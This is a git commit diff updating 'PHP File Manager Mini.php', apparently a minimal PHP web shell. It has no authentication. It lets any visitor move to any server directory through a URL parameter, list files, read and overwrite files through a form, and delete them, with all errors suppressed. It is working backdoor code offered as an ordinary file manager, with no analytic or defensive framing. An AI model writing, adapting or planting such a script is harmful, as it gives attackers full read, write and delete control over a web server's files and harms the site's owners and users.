c249b6e1eca0e0441120d7630525c6a26520ff0a
L0LZ666H05T <36075615+l0lz666h05t@users.noreply.github.com>
2019-01-28 19:59:11 +0700

    Update PHP File Manager Mini.php

--- PHP File Manager Mini.php
+++ PHP File Manager Mini.php
@@ -1,47 +1,82 @@
-<?php
-define('SEP', '/');
-function curldir() {
-	$curldir = @str_replace('\\', '/', @getcwd());
-	return $curldir;
+<?php 
+@define('SEP', '/');
+function pwd() {
+	$pwd = @str_replace('\\', '/', @getcwd());
+	return $pwd;
 }
-if (isset($_GET['dir'])) {
-	@chdir($_GET['dir']);
+function cwd() {
+	$cwd = @explode('/', pwd());
+	foreach ($cwd as $key => $index) {
+		print("<a href='?dir=");
+		for ($i=0; $i <= $key ; $i++) {
+			print($cwd[$i]);
+			if ($i != $key) {
+				print("/");
+			}
+		} print("'>".$index."</a>/");
+	}
 }
-function getdirname($dir) {
-	$scandir = @scandir($dir);
-	return $scandir;
+function scdir() {
+	$scdir = @scandir(@pwd());
+	return $scdir;
+}
+function alert_success($message) {
+	?><script>window.location='<?php print $message ?>';</script><?php
 }
 function edit($filename) {
 	if (isset($_POST['edit'])) {
 		if (@file_put_contents($filename, $_POST['edit'])) {
-			$valid = "Success";
+			$nb = "Success";
 		} else {
-			$valid = "Failed";
+			$nb = "Failed";
 		}
 	} $text = @htmlspecialchars(@file_get_contents($filename));
 	?>
 	<center>
+		<h4>Filename : <?php print $filename ?></h4>
 		<form method="post">
 			<textarea name="edit"><?php print $text ?></textarea><br>
 			<input type="submit">
 		</form>
 	</center>
 	<?php
+	die($nb);
+}
+function delete($filename) {
+	if (@file_exists($filename)) {
+		if (@unlink($filename)) {
+			@alert_success("?dir=".@pwd()."");
+		} else {
+			print("Failed");
+		}
+	}
+}
+if (isset($_GET['dir'])) {
+	@chdir($_GET['dir']);
 }
 if (@$_GET['action'] == 'edit' and isset($_GET['files'])) {
 	@edit($_GET['files']);
 }
-foreach (getdirname(curldir()) as $dir) {
+cwd();
+?>
+<table>
+	<tr>
+		<th>Filename</th>
+	</tr>
+<?php
+foreach (@scdir() as $dir) {
 	if(!is_dir($dir)) continue;
 	if ($dir === '.') {
-		$acction = "<center>--</center>";
-	} if ($dir === '..') {
-		$acction = "<center>--</center>";
+		$act = "<center>--</center>";
+	} elseif ($dir === '..') {
+		$act = "<center>--</center>";
 	}
-	print("<a href='?dir=".curldir().SEP.$dir."'>".$dir."</a>");
+	print("<tr><td>");
+	print("<a href='?dir=".@pwd().SEP.$dir."'>".$dir."</a></td>");
 }
-foreach (getdirname(curldir()) as $file) {
+foreach (@scdir() as $file) {
 	if(!is_file($file)) continue;
 	$tools = "<center>--</center>";
-	print("<a href='?action=edit&dir=".curldir()."&files=".$file."'>".$file."</a>");
+	print("<tr><td>");
+	print("<a href='?action=edit&dir=".@pwd()."&files=".$file."'>".$file."</a></td>");
 }
